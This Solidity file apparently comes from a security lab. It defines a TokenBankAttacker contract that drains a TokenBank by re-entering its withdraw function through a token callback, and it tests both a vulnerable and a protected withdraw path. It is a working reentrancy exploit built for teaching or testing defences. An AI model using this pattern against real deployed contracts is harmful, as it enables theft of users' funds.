// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import { TokenBank } from "src/labs/token/TokenBank.sol";

contract TokenBankAttacker {
    TokenBank public immutable bank;
    IERC20 public immutable token;

    uint256 private attackAmount;

    constructor(TokenBank _bank, IERC20 _token) {
        bank = _bank;
        token = _token;
    }

    function deposit(uint256 amount) external {
        token.approve(address(bank), amount);
        bank.deposit(address(token), amount);
    }

    function attackVulnerable(uint256 amount) external {
        attackAmount = amount;
        bank.withdrawVulnerable(address(token), amount);
    }

    function reenterVulnerable() external {
        require(msg.sender == address(token));
        bank.withdrawVulnerable(address(token), attackAmount);
    }

    function attackProtected(uint256 amount) external {
        attackAmount = amount;
        bank.withdrawProtected(address(token), amount);
    }

    function reenterProtected() external {
        require(msg.sender == address(token));
        bank.withdrawProtected(address(token), attackAmount);
    }
}
